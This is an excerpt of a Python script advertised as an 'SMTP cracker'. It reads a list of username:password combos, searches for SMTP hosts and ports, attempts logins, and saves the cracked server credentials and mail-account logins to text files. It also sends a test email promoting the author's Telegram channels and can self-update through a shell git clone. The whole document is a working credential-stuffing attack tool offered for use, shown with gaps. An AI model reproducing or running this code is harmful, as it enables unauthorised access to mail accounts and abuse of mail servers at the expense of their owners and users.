...
try:
  if os.name=='nt':
   ...
   os.system('clear')
    ...
    print("\033[91mERROR :| \nConatct MrxTawFik AS u LIKE !\033[00m")
msg0 =""
for i in msg0:
        sys.stdout.write(i)
        sys.stdout.flush()
...
class consumer(threading.Thread):
	...
	def findHost(self,host):
		print '\033[91m[\033[92MrxTawFik\033[91m]\033[92mSearching smtp host and port on \033[97m'+host+'\n'
		...
		for i,p in enumerate(self.ports):
			for j,h in enumerate(self.hosts):
				print '\033[91m[\033[92mMrxTawFik\033[91m]\033[92mTrying connection on\033[97m '+h+host+':'+str(p)+'\n'
				try:
					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.setblocking(0)
					s.settimeout(self.timeout)
	...
	def connect(self,tupple,ssl=False):
		...
		print '\033[91m[\033[92mMrxTawFik\033[91m]\033[92mTrying > \033[97m'+host+":"+port+":"+user+":"+passw+'\n'
		try:
			banner=s.recv(1024)
			if banner[0:3]!="220":
				self.sendCmd(s,'QUIT')
			...
			save=open('MrxTawFik/Smtps.txt','a').write(host+":"+port+","+user+","+passw+"\n")
			save=open('MrxTawFik/Mailaccess.txt','a').write(user+":"+passw+"\n")
...
<body>
	<center>
		...
		<font color="#f16f6f"><h1>[ ! ]Developped by Mrx TawFik [ ! ]</h1></font><br><br><br>
		...
		<font color="black" size="5" ><font color="red">Telegram Connect via :</font> https://T.me//MrxTawFiik <br><br></font>
		<font color="black" size="5" ><font color="red">Telegram channel :</font> <a href="https://T.me//Mrx_TawFiik">Click HEre</a><br><br></font>
		<h2>© MrxTawFik 2023</h2>
	</body>
	</html>\r\n.\r\n'''
			s.send(headers)
			rez=s.recv(1000)
...
try:
 ...
 pass
save=open('information.txt','a').write(' [+]Welcome Again Smtp Cracker \n [+] Developped By MrxTawFik\n [+] Telegram Connect via  : https://T.me//Mrx_TawFiik \n [*] Telegram channel : https://T.me//MrxTawFiik ')
tld=open('information.txt','r').read().splitlines()
tlds=cache={}
bads=[]
cracked=[]
rbads=0
...
print('''
  ...
  \033[91m  ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ███████║██║ ╚═╝ ██║   ██║   ██║         
   \033[93m  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝         
              ...
              \033[91m[\033[92m+\033[91m]\033[1m  Developped By MrxTawFik \033[91m]\033[95m SMTP CRACKER V2.1  \033[91m [\033[92m+\033[91m]
             \033[91m[\033[92m+\033[91m]\033[92m Telegram Connect via : https://T.me//MrxTawFiik \033[91m[\033[92m+\033[91m]
             \033[91m[\033[92m+\033[91m]  Telegram channel : https://T.me//Mrx_TawFiik   \033[91m[\033[92m+\033[91m]''')
ms0g ="\n\033[93m         < Checking\033[0;96m Your\033[91m Version  (%s)\033[92m "%vers
for i in ms0g:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)
if vers=='2.1':
 ...
 print("\033[91mThere is New  ion available !! Do you Want To Update Your tool ? \033[00m")
 ok=raw_input('''
 ...
 if ok=='1':
  ...
  os.system('git clone https://github.com/MrxTawFik/Smtp-cracker && cd Smtp-cracker')
  if os.name=='nt':
   os.system('cls')
  else:
   os.system('clear')
  ...
  pass
try:
  inputs=open(raw_input('\033[91m[\033[92m+\033[91m]\033[92m List Combos : \033[97m'),'r').read().splitlines()
except:
	sys.exit("\n\033[91m{!} The file name is incorrect \033[00m")
